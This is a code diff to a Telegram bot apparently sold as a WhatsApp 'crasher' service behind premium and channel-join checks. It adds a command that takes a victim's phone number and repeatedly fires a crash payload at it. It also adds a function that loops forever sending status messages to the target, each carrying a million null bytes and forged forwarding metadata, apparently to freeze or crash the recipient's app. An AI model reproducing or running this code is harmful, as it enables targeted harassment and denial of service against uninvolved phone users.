@@ -2099,6 +2099,83 @@ been successfully analyzed.
 // ALL BUG COMMAND
 // ==========================================
 
+bot.command('testnew', checkWhatsAppConnection, checkPremiumAccess, requireJoinChannel, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+
+──────────────────────────
+</pre>`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 10; i++) {
+                try {
+                    if (!sock) {
+                        throw new Error("Socket unavailable");
+                    }
+                    await delayHardV1(target);
+                    await sleep(1000)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    autoRestartOn408(e);
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+    }
+});
+
 bot.command('spamandro', checkWhatsAppConnection, checkPremiumAccess, requireJoinChannel, async (ctx) => {
     
     let q = ctx.message?.text?.split(" ")[1];
@@ -3081,5 +3158,49 @@ async function P7X(sock, target) {
 }, { participant: { jid: target }});
 }
 
+async function Vdelay(target) {
+  while (true) {
+    await sock.sendMessage("status@broadcast", {
+      text: "WHY",
+      contextInfo: {
+        remoteJid: "undefined@s.whatsapp.net",
+        mentionedJid: ["status@broadcast"],
+        isForwarded: true,
+        forwardingScore: 9999
+      },
+      buttons: [
+        {
+          buttonId: "\0",
+          buttonText: { displayText: " 696 " },
+          type: 3,
+          nativeFlowInfo: {
+            name: "voice_call",
+            paramsJson: "\0".repeat(1000000)
+          }
+        }
+      ]
+    }, { 
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {
+          status_setting: "allowlist"
+        },
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{
+            tag: "to",
+            attrs: {
+              jid: target
+            }
+          }]
+        }]
+      }]
+    });
+    
+    await new Promise((r) => setTimeout(r, 2000));
+  }
+}
 
 bot.launch()
